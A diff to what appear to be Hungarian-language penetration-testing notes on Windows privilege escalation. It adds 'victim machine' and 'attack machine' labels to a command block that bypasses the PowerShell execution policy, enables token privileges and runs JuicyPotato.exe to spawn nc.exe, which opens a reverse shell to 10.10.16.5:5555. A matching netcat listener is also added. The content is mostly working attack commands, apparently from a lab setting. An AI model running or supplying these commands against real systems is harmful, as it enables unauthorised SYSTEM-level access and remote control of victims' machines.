@@ -16,9 +16,13 @@
       * https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
     * Valasszuk ki a megfelelo oprendszer verziot, es ott 4-5 darabot probaljunk meg a clsid-k kozul, valamelyiknek mukodnie kell
 <pre>
+<b># victim machine</b>
 PS> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
 PS> Import-Module .\EnableAllTokenPrivs.ps1
 PS> Enable-Privilege -Privilege SeAssignPrimaryTokenPrivilege
 PS> whoami /priv (most mar elvileg Enabled lett)
 PS> .\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\downloads\nc.exe 10.10.16.5 5555 -e c:\windows\system32\cmd.exe" -t * -c "{03ca98d6-ff5d-49b8-abc6-03dd84127020}"
+
+<b># attack machine</b>
+$ nc -nvlp 5555
 </pre>
